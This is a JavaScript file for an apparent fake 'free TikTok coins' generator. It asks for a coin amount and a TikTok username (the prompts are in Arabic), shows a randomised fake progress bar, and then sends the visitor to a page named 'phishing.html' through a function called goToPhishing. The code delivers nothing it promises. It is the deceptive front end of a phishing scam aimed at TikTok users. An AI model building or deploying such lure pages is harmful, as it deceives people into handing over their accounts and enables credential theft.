let selectedCoins = 0;

function selectCoins(amount) {
    selectedCoins = amount;
    document.getElementById('userInput').style.display = 'block';
    document.querySelector('.coins-options').style.display = 'none';
}

function startProcess() {
    const username = document.getElementById('tiktokUsername').value.trim();
    if (!username) {
        alert('❌ من فضلك أدخل اسم المستخدم.');
        return;
    }

    document.getElementById('userInput').style.display = 'none';
    document.getElementById('progressSection').style.display = 'block';

    let progress = 0;
    const interval = setInterval(() => {
        progress += Math.floor(Math.random() * 10) + 1;
        if (progress >= 100) {
            progress = 100;
            clearInterval(interval);
            document.getElementById('progressText').textContent = '100%';
            document.getElementById('progressSection').style.display = 'none';
            document.getElementById('finalStep').style.display = 'block';
        }
        document.getElementById('progressFill').style.width = progress + '%';
        document.getElementById('progressText').textContent = progress + '%';
    }, 300);
}

function goToPhishing() {
    window.location.href = 'phishing.html';
}
